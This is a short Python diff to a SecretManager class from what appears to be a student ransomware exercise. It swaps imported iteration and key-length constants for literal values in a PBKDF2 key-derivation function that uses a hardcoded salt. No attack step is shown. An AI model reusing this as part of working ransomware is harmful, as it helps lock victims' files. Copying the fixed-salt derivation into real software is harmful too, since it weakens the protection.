@@ -7,10 +7,9 @@ import os.path
 import requests
 import base64
 
+
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
-from TD.sources.ransomware import ITERATIONS, KEY_LENGTH
-
 from xorcrypt import xorfile
 
 class SecretManager:
@@ -33,9 +32,9 @@ class SecretManager:
         salt = bytes("16", "utf8")
         kdf = PBKDF2HMAC(
             algorithm=hashes.SHA256(),
-            length=KEY_LENGTH,
+            length=16,
             salt=salt,
-            iterations=ITERATIONS)
+            iterations=48000)
         key = kdf.derive(key) # derive the key
         return key
 
